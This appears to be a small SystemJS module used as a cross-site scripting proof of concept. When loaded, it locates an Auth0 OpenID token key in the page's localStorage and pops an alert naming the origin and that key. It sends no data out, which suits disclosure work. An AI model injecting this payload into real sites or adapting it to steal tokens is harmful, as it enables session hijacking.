System.register([], function () {
  return { execute: function () {
    var k = Object.keys(localStorage).find(function (x) {
      return /auth0/i.test(x) && /openid/i.test(x);
    });
    alert("XSS executing in origin: " + location.origin +
          "\nReachable Auth0 token key: " + (k || "none"));
  }};
});
